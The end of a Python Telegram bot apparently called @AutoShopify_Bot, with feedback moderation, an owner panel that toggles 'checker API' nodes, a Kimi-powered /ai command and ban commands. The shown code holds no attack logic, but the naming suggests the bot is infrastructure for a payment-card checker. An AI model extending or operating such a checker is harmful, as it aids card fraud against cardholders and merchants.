                            custom_emoji_id=getattr(ent, "custom_emoji_id", None),
                        ))
                else:
                    caption = cmd_body
                    entities = _fb_shift_entities(message.entities, cmd_body, cmd_prefix)
            else:
                caption = reply_cap
                entities = list(message.reply_to_message.caption_entities or [])
        else:
            caption = reply_cap
            entities = list(message.reply_to_message.caption_entities or [])

    return photo, caption, entities


_fb_store: dict[str, dict] = {}
_fb_processed: set[str] = set()


@router.message(Command("f"))
async def cmd_feedback(message: types.Message):
    joined = await check_user_joined(message.from_user.id)
    if not joined:
        await message.reply(JOIN_MSG, reply_markup=join_keyboard())
        return

    user_id = message.from_user.id
    if auth.is_banned(user_id):
        return

    photo, caption, caption_entities = _fb_parse_input(message)
    caption_html = _fb_text_to_html(caption, caption_entities)

    if not photo or not caption:
        await message.reply(
            f"{_fb_e()} {bold('Feedback Usage')}\n\n"
            f"{_fb_e()} {bold('Send a photo with caption:')}\n"
            f"    /f your feedback message\n\n"
            f"{_fb_e()} {bold('Or reply to a photo with:')}\n"
            f"    /f your feedback message\n\n"
            f"{pe(E['warn'])} {bold('Both photo and message are required!')}"
        )
        return

    user_name = message.from_user.full_name or ""
    user_uname = message.from_user.username or ""
    now = datetime.datetime.now(datetime.timezone.utc).strftime("%Y-%m-%d %H:%M UTC")

    fb_key = f"{user_id}:{message.message_id}"

    _fb_store[fb_key] = {
        "photo": photo,
        "caption": caption,
        "caption_html": caption_html,
        "uid": user_id,
        "name": user_name,
        "uname": user_uname,
        "date": now,
    }

    admin_text = (
        f"{_fb_e()} {bold('New Feedback Received!')}\n\n"
        f"{_fb_e()} {bold('From:')} {user_link(user_id, user_name, user_uname)}\n"
        f"{_fb_e()} {bold('Name:')} {bold(_html.escape(user_name))}\n"
        f"{_fb_e()} {bold('Username:')} {bold('@' + _html.escape(user_uname) if user_uname else '-')}\n"
        f"{_fb_e()} {bold('User ID:')} {bold(str(user_id))}\n"
        f"{_fb_e()} {bold('Date:')} {bold(now)}\n\n"
        f"{_fb_e()} {bold('Message:')}\n{caption_html}"
    )

    fb_kb = {
        "inline_keyboard": [[
            {
                "text": f"{bold('Accept')}",
                "callback_data": f"fb_accept:{fb_key}",
                "icon_custom_emoji_id": E["check"],
                "style": "primary",
            },
            {
                "text": f"{bold('Reject')}",
                "callback_data": f"fb_reject:{fb_key}",
                "icon_custom_emoji_id": E["cross"],
                "style": "danger",
            },
        ]]
    }

    admins = auth.load_admins()
    if auth.OWNER_ID and auth.OWNER_ID not in admins:
        admins.append(auth.OWNER_ID)

    sent_count = 0
    for admin_id in admins:
        try:
            await bot.send_photo(
                admin_id,
                photo,
                caption=admin_text,
                parse_mode=ParseMode.HTML,
                reply_markup=fb_kb,
            )
            sent_count += 1
        except Exception:
            pass

    if sent_count > 0:
        await message.reply(
            f"{_fb_e()} {bold('Feedback Sent Successfully!')}\n\n"
            f"{_fb_e()} {bold('Your feedback has been submitted to the admins.')}\n"
            f"{_fb_e()} {bold('Thank you for your feedback!')}"
        )
    else:
        await message.reply(f"{pe(E['cross'])} {bold('Failed to send feedback. Try again later.')}")


@router.callback_query(F.data.startswith("fb_accept:"))
async def cb_feedback_accept(callback: types.CallbackQuery):
    if not auth.is_admin(callback.from_user.id):
        await callback.answer(bold("Admins only!"), show_alert=True)
        return

    fb_key = callback.data.split(":", 1)[1]

    if fb_key in _fb_processed:
        await callback.answer(bold("This feedback is already processed!"), show_alert=True)
        return

    fb = _fb_store.get(fb_key)
    if not fb:
        await callback.answer(bold("Feedback expired or not found!"), show_alert=True)
        return

    _fb_processed.add(fb_key)

    uid = fb["uid"]
    name = fb["name"]
    uname = fb["uname"]
    date = fb["date"]
    caption = fb["caption"]
    caption_html = fb.get("caption_html") or _html.escape(caption)
    photo = fb["photo"]

    group_text = (
        f"{_fb_e()} {bold('Bot Feedback')}\n\n"
        f"{_fb_e()} {bold('Bot:')} @AutoShopify_Bot\n"
        f"{_fb_e()} {bold('From:')} {user_link(uid, name, uname)}\n"
        f"{_fb_e()} {bold('Name:')} {bold(_html.escape(name))}\n"
        f"{_fb_e()} {bold('Username:')} {bold('@' + _html.escape(uname) if uname else '-')}\n"
        f"{_fb_e()} {bold('User ID:')} {bold(str(uid))}\n"
        f"{_fb_e()} {bold('Date:')} {bold(date)}\n\n"
        f"{_fb_e()} {bold('Feedback:')}\n{caption_html}\n\n"
        f"{_fb_e()} {bold('Approved by:')} {user_link(callback.from_user.id, callback.from_user.full_name or '', callback.from_user.username or '')}"
    )

    try:
        sent = await bot.send_photo(
            FEEDBACK_GROUP_ID, photo, caption=group_text, parse_mode=ParseMode.HTML,
        )
        try:
            await bot.pin_chat_message(FEEDBACK_GROUP_ID, sent.message_id, disable_notification=True)
        except Exception:
            pass
    except Exception:
        _fb_processed.discard(fb_key)
        await callback.answer(bold("Failed to send to group!"), show_alert=True)
        return

    msg = callback.message
    try:
        await msg.edit_caption(
            caption=(msg.caption or "") + f"\n\n{pe(E['check'])} {bold('Accepted by')} {user_link(callback.from_user.id, callback.from_user.full_name or '', callback.from_user.username or '')}",
            parse_mode=ParseMode.HTML,
            reply_markup=None,
        )
    except Exception:
        pass

    _fb_store.pop(fb_key, None)
    await callback.answer(bold("Feedback accepted & posted!"), show_alert=True)


@router.callback_query(F.data.startswith("fb_reject:"))
async def cb_feedback_reject(callback: types.CallbackQuery):
    if not auth.is_admin(callback.from_user.id):
        await callback.answer(bold("Admins only!"), show_alert=True)
        return

    fb_key = callback.data.split(":", 1)[1]

    if fb_key in _fb_processed:
        await callback.answer(bold("This feedback is already processed!"), show_alert=True)
        return

    _fb_processed.add(fb_key)

    msg = callback.message
    try:
        await msg.edit_caption(
            caption=(msg.caption or "") + f"\n\n{pe(E['cross'])} {bold('Rejected by')} {user_link(callback.from_user.id, callback.from_user.full_name or '', callback.from_user.username or '')}",
            parse_mode=ParseMode.HTML,
            reply_markup=None,
        )
    except Exception:
        pass

    _fb_store.pop(fb_key, None)
    await callback.answer(bold("Feedback rejected."), show_alert=True)


# ══════════════════════════════════════════════════════════════════════════════
#  /api COMMAND — Owner: check + toggle checker API nodes
# ══════════════════════════════════════════════════════════════════════════════

async def _build_api_message() -> tuple[str, dict]:
    """
    Build the /api status message + inline keyboard.
    Pings all nodes in parallel and shows health + enabled/disabled toggle.
    """
    nodes = checker_bridge.get_all_nodes()

    # Ping all nodes concurrently
    health_tasks = [checker_bridge.check_node_health(n) for n in nodes]
    health_results = await asyncio.gather(*health_tasks, return_exceptions=True)

    lines = [f"{pe(E['globe'])} {bold('Checker API Nodes')}\n"]
    kb_rows = []

    for i, (node, alive) in enumerate(zip(nodes, health_results)):
        if isinstance(alive, Exception):
            alive = False

        disabled = checker_bridge.is_node_disabled(node)
        ip_port  = node.replace("http://", "")

        # Status indicators
        if disabled:
            status_icon = pe(E["cross"])
            status_text = bold("DISABLED")
        elif alive:
            status_icon = pe(E["check"])
            status_text = bold("Online")
        else:
            status_icon = pe(E["warn"])
            status_text = bold("Offline")

        lines.append(
            f"{pe(E['bolt'])} {bold(f'Node {i+1}:')} {bold(ip_port)}\n"
            f"   {status_icon} {status_text}"
        )

        # Toggle button: if currently disabled → show Enable (green), else show Disable (red)
        if disabled:
            btn_text  = f"{bold(f'Node {i+1}')} — Enable"
            btn_style = "success"
        else:
            btn_text  = f"{bold(f'Node {i+1}')} — Disable"
            btn_style = "danger"

        kb_rows.append([{
            "text":          btn_text,
            "callback_data": f"api_toggle:{i}",
            "style":         btn_style,
        }])

    # Refresh button at the bottom
    kb_rows.append([{
        "text":          f"{bold('Refresh Status')}",
        "callback_data": "api_refresh",
        "icon_custom_emoji_id": E["refresh"],
        "style":         "primary",
    }])

    text = "\n\n".join(lines)
    keyboard = {"inline_keyboard": kb_rows}
    return text, keyboard


@router.message(Command("api"))
async def cmd_api(message: types.Message):
    if not auth.is_owner(message.from_user.id):
        await message.reply(f"{pe(E['cross'])} {bold('Owner only command!')}")
        return

    loading = await message.reply(f"{pe(E['loading'])} {bold('Checking all API nodes...')}")
    text, kb = await _build_api_message()
    try:
        await safe_edit(loading, text, reply_markup=kb)
    except Exception:
        pass


@router.callback_query(F.data.startswith("api_toggle:"))
async def cb_api_toggle(callback: types.CallbackQuery):
    if not auth.is_owner(callback.from_user.id):
        await callback.answer(bold("Owner only!"), show_alert=True)
        return

    try:
        idx = int(callback.data.split(":", 1)[1])
    except (ValueError, IndexError):
        await callback.answer()
        return

    nodes = checker_bridge.get_all_nodes()
    if idx < 0 or idx >= len(nodes):
        await callback.answer(bold("Invalid node index."), show_alert=True)
        return

    node = nodes[idx]
    ip_port = node.replace("http://", "")

    if checker_bridge.is_node_disabled(node):
        checker_bridge.enable_node(node)
        await callback.answer(f"Node {idx+1} ({ip_port}) ENABLED", show_alert=False)
    else:
        checker_bridge.disable_node(node)
        await callback.answer(f"Node {idx+1} ({ip_port}) DISABLED", show_alert=False)

    # Rebuild and update the message
    text, kb = await _build_api_message()
    try:
        await safe_edit(callback.message, text, reply_markup=kb)
    except Exception:
        pass


@router.callback_query(F.data == "api_refresh")
async def cb_api_refresh(callback: types.CallbackQuery):
    if not auth.is_owner(callback.from_user.id):
        await callback.answer(bold("Owner only!"), show_alert=True)
        return

    await callback.answer(bold("Refreshing..."))
    text, kb = await _build_api_message()
    try:
        await safe_edit(callback.message, text, reply_markup=kb)
    except Exception:
        pass


# ══════════════════════════════════════════════════════════════════════════════
#  /ai — Kimi AI assistant
# ══════════════════════════════════════════════════════════════════════════════

try:
    import ai as _ai_mod
    _AI_AVAILABLE = True
except ImportError:
    _ai_mod = None
    _AI_AVAILABLE = False

# Supported text-extractable MIME types / extensions for /ai file uploads
_AI_TEXT_EXTS = {
    ".txt", ".md", ".py", ".js", ".ts", ".jsx", ".tsx",
    ".html", ".css", ".json", ".yaml", ".yml", ".toml",
    ".csv", ".xml", ".sh", ".bash", ".c", ".cpp", ".h",
    ".java", ".kt", ".go", ".rs", ".php", ".rb", ".swift",
    ".sql", ".r", ".m", ".cs", ".vb", ".asm", ".ps1",
    ".ini", ".cfg", ".conf", ".log", ".env",
}
_AI_MAX_FILES     = 5
_AI_MAX_TOTAL_MB  = 10
_AI_MAX_FILE_BYTES = _AI_MAX_TOTAL_MB * 1024 * 1024


async def _ai_extract_file_text(file_id: str, file_name: str) -> str | None:
    """Download a document and return its text content, or None on failure."""
    from io import BytesIO
    ext = os.path.splitext(file_name or "")[1].lower()
    if ext not in _AI_TEXT_EXTS:
        return None
    try:
        buf = BytesIO()
        await bot.download(file_id, destination=buf)
        buf.seek(0)
        return buf.read().decode("utf-8", errors="replace")
    except Exception:
        return None


@router.message(Command("ai"))
async def cmd_ai(message: types.Message):
    """AI assistant powered by Kimi — /ai <prompt> (optionally attach up to 5 files)."""
    joined = await check_user_joined(message.from_user.id)
    if not joined:
        await message.reply(JOIN_MSG, reply_markup=join_keyboard())
        return
    if auth.is_banned(message.from_user.id):
        return
    if not _AI_AVAILABLE:
        await message.reply(f"{pe(E['cross'])} {bold('AI module not available.')}")
        return

    # ── Extract prompt text ───────────────────────────────────────────────────
    args = (message.text or "").split(None, 1)
    prompt = args[1].strip() if len(args) > 1 else ""

    # Also grab text from a replied-to message
    if message.reply_to_message:
        reply_text = (
            message.reply_to_message.text or
            message.reply_to_message.caption or ""
        ).strip()
        if reply_text:
            prompt = (prompt + "\n\n" + reply_text).strip()

    # ── Collect documents ─────────────────────────────────────────────────────
    # Gather docs from this message AND the replied-to message (up to 5 total)
    candidate_docs: list[tuple[str, str, int]] = []   # (file_id, file_name, size)

    def _add_doc(doc):
        if doc and doc.file_size and doc.file_size <= _AI_MAX_FILE_BYTES:
            candidate_docs.append((doc.file_id, doc.file_name or "file", doc.file_size))

    _add_doc(message.document)
    if message.reply_to_message:
        _add_doc(message.reply_to_message.document)
        # Media groups: check photo/audio/video too (ignore — text files only)

    # Trim to 5 files and total size limit
    selected_docs: list[tuple[str, str]] = []
    total_bytes = 0
    for fid, fname, fsize in candidate_docs[:_AI_MAX_FILES]:
        if total_bytes + fsize > _AI_MAX_FILE_BYTES:
            break
        selected_docs.append((fid, fname))
        total_bytes += fsize

    # ── Validate ──────────────────────────────────────────────────────────────
    if not prompt and not selected_docs:
        await message.reply(
            f"{pe(E['bolt'])} {bold('/ai — Kimi AI Assistant')}\n\n"
            f"{pe(E['next'])} {bold('Usage:')} /ai your question here\n"
            f"{pe(E['next'])} {bold('Files:')} attach up to {_AI_MAX_FILES} text/code files "
            f"(max {_AI_MAX_TOTAL_MB} MB total) with your /ai command\n\n"
            f"{pe(E['star'])} {bold('Supported file types:')} .txt .py .js .ts .json .md "
            f".html .css .sql .sh .cpp .java .go .rs .csv …\n\n"
            f"{pe(E['check'])} You can also {bold('reply')} to any message with /ai to include it."
        )
        return

    if not prompt:
        prompt = "Please analyse and explain the provided file(s) thoroughly."

    # ── Download file contents ────────────────────────────────────────────────
    file_contents: list[tuple[str, str]] = []
    skipped: list[str] = []
    for fid, fname in selected_docs:
        text = await _ai_extract_file_text(fid, fname)
        if text is not None:
            file_contents.append((fname, text))
        else:
            skipped.append(fname)

    # ── Send loading indicator ────────────────────────────────────────────────
    loading_msg = await message.reply(
        f"🤖 {bold('Thinking...')}",
    )

    # ── Call Kimi API ─────────────────────────────────────────────────────────
    try:
        response: str = await _ai_mod.ask_kimi(
            prompt=prompt,
            file_contents=file_contents if file_contents else None,
        )
    except httpx.HTTPStatusError as e:
        await safe_edit(loading_msg,
            f"{pe(E['cross'])} {bold('Kimi API error:')} {e.response.status_code} — "
            f"{e.response.text[:200]}"
        )
        return
    except Exception as e:
        await safe_edit(loading_msg,
            f"{pe(E['cross'])} {bold('AI error:')} {str(e)[:300]}"
        )
        return

    # ── Build skipped-files notice ────────────────────────────────────────────
    notice = ""
    if skipped:
        notice = (
            f"\n\n{pe(E['warn'])} {bold('Unsupported / skipped files:')} "
            + ", ".join(skipped)
            + "\n(Supported: plain text, source code files)"
        )

    # ── Decide: text message or file attachment? ──────────────────────────────
    if _ai_mod.needs_file(response):
        fname     = _ai_mod.choose_filename(response, prompt)
        file_data = response.encode("utf-8")
        caption   = (
            f"🤖 {bold('AI Response')}"
            + (f" — {bold(fname)}" if fname != "ai_response.txt" else "")
            + (f"\n📎 {bold('Response too long or contains code — sent as file.')}")
            + notice
        )
        try:
            await loading_msg.delete()
        except Exception:
            pass
        await message.reply_document(
            types.BufferedInputFile(file_data, filename=fname),
            caption=caption[:1020],   # caption limit 1024
        )
    else:
        # Short enough to send as a formatted message
        formatted = _ai_mod.format_for_telegram(response)
        await safe_edit(loading_msg, f"🤖 {formatted}" + notice)


# ══════════════════════════════════════════════════════════════════════════════
#  OWNER BAN COMMANDS
# ══════════════════════════════════════════════════════════════════════════════

@router.message(Command("ban"))
async def cmd_ban(message: types.Message):
    """Owner: /ban <user_id>  or reply to a message."""
    if not auth.is_owner(message.from_user.id):
        await message.reply(f"{pe(E['cross'])} {bold('Owner only command!')}")
        return

    target_id: int | None = None

    # Reply-to case
    if message.reply_to_message and message.reply_to_message.from_user:
        target_id = message.reply_to_message.from_user.id

    # Argument case: /ban 123456789
    if not target_id:
        args = (message.text or "").split()
        if len(args) >= 2:
            try:
                target_id = int(args[1])
            except ValueError:
                pass

    if not target_id:
        await message.reply(
            f"{pe(E['cross'])} {bold('Usage:')} /ban &lt;user_id&gt;  or reply to a message"
        )
        return

    if target_id == message.from_user.id:
        await message.reply(f"{pe(E['warn'])} {bold('You cannot ban yourself.')}")
        return

    if auth.is_owner(target_id):
        await message.reply(f"{pe(E['warn'])} {bold('Cannot ban the owner.')}")
        return

    ban_user(target_id)
    await message.reply(
        f"{pe(E['check'])} {bold('User Banned!')}\n"
        f"{pe(E['bolt'])} {bold('ID:')} <code>{target_id}</code>\n"
        f"{pe(E['warn'])} {bold('All future messages from this user will be silently dropped.')}"
    )


@router.message(Command("unban"))
async def cmd_unban(message: types.Message):
    """Owner: /unban <user_id>"""
    if not auth.is_owner(message.from_user.id):
        await message.reply(f"{pe(E['cross'])} {bold('Owner only command!')}")
        return

    args = (message.text or "").split()
    if len(args) < 2:
        await message.reply(f"{pe(E['cross'])} {bold('Usage:')} /unban &lt;user_id&gt;")
        return

    try:
        target_id = int(args[1])
    except ValueError:
        await message.reply(f"{pe(E['cross'])} {bold('Invalid user ID.')}")
        return

    if target_id not in _banned_users:
        await message.reply(f"{pe(E['warn'])} {bold('User')} <code>{target_id}</code> {bold('is not banned.')}")
        return

    unban_user(target_id)
    await message.reply(
        f"{pe(E['check'])} {bold('User Unbanned!')}\n"
        f"{pe(E['bolt'])} {bold('ID:')} <code>{target_id}</code>"
    )


@router.message(Command("banned"))
async def cmd_banned_list(message: types.Message):
    """Owner: show all banned users."""
    if not auth.is_owner(message.from_user.id):
        await message.reply(f"{pe(E['cross'])} {bold('Owner only command!')}")
        return

    if not _banned_users:
        await message.reply(f"{pe(E['check'])} {bold('No banned users.')}")
        return

    lines = [f"{pe(E['cross'])} {bold(f'Banned Users ({len(_banned_users)}):')}\n"]
    for uid in sorted(_banned_users):
        lines.append(f"  • <code>{uid}</code>")

    lines.append(f"\n{pe(E['warn'])} {bold('Use /unban &lt;id&gt; to unban.')}")
    await message.reply("\n".join(lines))


# ══════════════════════════════════════════════════════════════════════════════
#  MAIN ENTRY
# ══════════════════════════════════════════════════════════════════════════════

async def main():
    me = await bot.get_me()
    log.info(f"⚡ Bot @{me.username} is running...")

    # Log all registered handlers for debugging
    for obs in router.message.handlers:
        log.info(f"  📌 Registered handler: {obs.callback.__name__}")

    await bot.delete_webhook(drop_pending_updates=True)
    try:
        # skip_updates=True drops ALL queued updates from when the bot was offline.
        # Without this, every /ran sent during downtime floods the event loop on restart.
        # allowed_updates whitelist prevents Telegram from sending exotic update types
        # (rich_message, etc.) that cause pydantic model_validate to hang indefinitely
        # on deeply-nested recursive JSON payloads (DoS vector).
        await dp.start_polling(
            bot,
            skip_updates=True,
            allowed_updates=[
                "message",
                "edited_message",
                "callback_query",
                "inline_query",
                "chat_member",
                "my_chat_member",
                "chat_join_request",
            ],
        )
    finally:
        CHECKER_POOL.shutdown(wait=False)
        await close_session()
        await bot.session.close()


if __name__ == "__main__":
    # Raise OS file descriptor limit to prevent "too many open files" under load
    try:
        import resource
        soft, hard = resource.getrlimit(resource.RLIMIT_NOFILE)
        target = min(65536, hard)
        if soft < target:
            resource.setrlimit(resource.RLIMIT_NOFILE, (target, hard))
            log.info(f"📂 Raised fd limit: {soft} → {target}")
    except Exception:
        pass  # Windows or restricted — handled by reduced thread count
    try:
        asyncio.run(main())
    except (KeyboardInterrupt, SystemExit):
        log.info("Bot stopped.")
